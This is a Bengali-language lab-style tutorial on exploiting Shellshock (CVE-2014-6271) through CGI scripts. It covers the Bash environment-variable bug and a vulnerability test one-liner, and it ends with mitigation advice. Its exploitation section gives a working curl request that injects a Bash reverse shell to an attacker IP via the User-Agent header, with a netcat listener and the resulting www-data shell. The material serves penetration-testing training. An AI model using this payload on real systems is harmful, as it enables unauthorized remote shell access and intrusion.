# Attacking Common Gateway Interface (CGI) Applications – Shellshock

## CGI কী?

- [CGI](https://www.w3.org/CGI/?utm_source=chatgpt.com) web server-কে Dynamic page তৈরি ও user request অনুযায়ী response দিতে সাহায্য করে।
- এটি web server, external database ও information source-এর মধ্যে middleware হিসেবে কাজ করে।
- CGI script সাধারণত `/CGI-bin` directory-তে থাকে এবং C, C++, Java, PERL ইত্যাদি language-এ লেখা যায়।
- Script web server-এর security context-এ চলে।
- Guestbook, form (email, feedback, registration), mailing list ও blog-এ ব্যবহার হয়।

CGI ব্যবহারের কারণ:

- Web server-এর user-এর সঙ্গে dynamic interaction প্রয়োজন হলে।
- User form submit করলে CGI application data process করে result ফেরত দেয়।

CGI কাজের ধাপ:

1. Web server-এ `CGI-bin` directory তৈরি করা হয়।
2. User URL দিয়ে request পাঠায়, যেমন: [https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl?utm_source=chatgpt.com)
3. Server script চালিয়ে output browser-এ পাঠায়।

- প্রতিটি HTTP request-এর জন্য নতুন process ও database connection তৈরি হয়।
- এতে memory বেশি লাগে এবং page load-এর মধ্যে data cache করা যায় না।
- CGI পুরোনো technology; আধুনিক web application-এ দ্রুত ও নিরাপদ technology দিয়ে প্রতিস্থাপিত হয়েছে।
- তবে penetration testing-এ, বিশেষ করে embedded/IoT device-এ CGI পাওয়া যেতে পারে।

## CGI Attacks – Shellshock

- CGI-এর মাধ্যমে পরিচিত attack হলো Shellshock (Bash bug)।
- [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271?utm_source=chatgpt.com) ২০১৪ সালে আবিষ্কৃত হয়।
- এটি GNU Bash version `4.3` পর্যন্ত থাকা vulnerability।
- Environment variable-এর মাধ্যমে unintended command execute করা যায়।
- আবিষ্কারের সময় bug-টি প্রায় ২৫ বছরের পুরোনো ছিল।

## Shellshock via CGI

- পুরোনো Bash environment variable-এ function সংরক্ষণের সময় ভুলভাবে handle করে।
- Vulnerable Bash function definition-এর পরে থাকা command-ও execute করতে পারে।

উদাহরণ:

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

- `y='() { :;};'` একটি function definition।
- Function কিছু করে না, শুধু exit code `0` দেয়।
- Vulnerable Bash-এ function import করার সময় `echo vulnerable-shellshock` execute হবে।
- CGI দিয়ে exploit করলে command web server user-এর context-এ চলে, সাধারণত `www-data`।
- কখনো web server elevated context-এ চললে `root` access-ও পাওয়া সম্ভব।

Vulnerable না হলে output:

```
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```

- Patched Bash function import-এর পরে থাকা command execute করে না।
- এখন environment variable-এ function definition-এর আগে `BASH_FUNC_` prefix প্রয়োজন।

### 3. Exploitation – Reverse Shell

Vulnerability confirmed হলে Bash reverse shell দিয়ে access নেওয়া যায়।

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Attacker machine-এ Netcat listener:

```
sudo nc -lvnp 7777
```

Output:

```
listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$
```

- এখন `www-data` হিসেবে shell access পাওয়া গেছে।
- এরপর sensitive data খোঁজা, privilege escalation অথবা internal network-এ pivot করা যায়।

## Mitigation

[DigitalOcean – Protect Server Against Shellshock](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability?utm_source=chatgpt.com)

- সবচেয়ে ভালো সমাধান হলো affected system-এর Bash update করা।
- পুরোনো Ubuntu/Debian system-এ আগে package manager upgrade করতে হতে পারে।
- IoT device-এর মতো কিছু system update করা সম্ভব নাও হতে পারে।
- সে ক্ষেত্রে:
  - System যেন internet থেকে exposed না থাকে তা নিশ্চিত করা।
  - Host decommission করা সম্ভব কি না দেখা।
  - Critical host হলে internal network-এ firewall দিয়ে যতটা সম্ভব isolate করা।
- Firewall workaround স্থায়ী সমাধান নয়; সবচেয়ে ভালো হলো upgrade করা অথবা host offline করা।

## Closing Thoughts

- Shellshock পুরোনো vulnerability হলেও penetration test-এ এখনও পাওয়া যেতে পারে।
- CGI script ব্যবহার করা web application, বিশেষ করে IoT device, পেলে এই পদ্ধতিতে পরীক্ষা করা উচিত।
- সহজেই initial foothold পাওয়া সম্ভব।
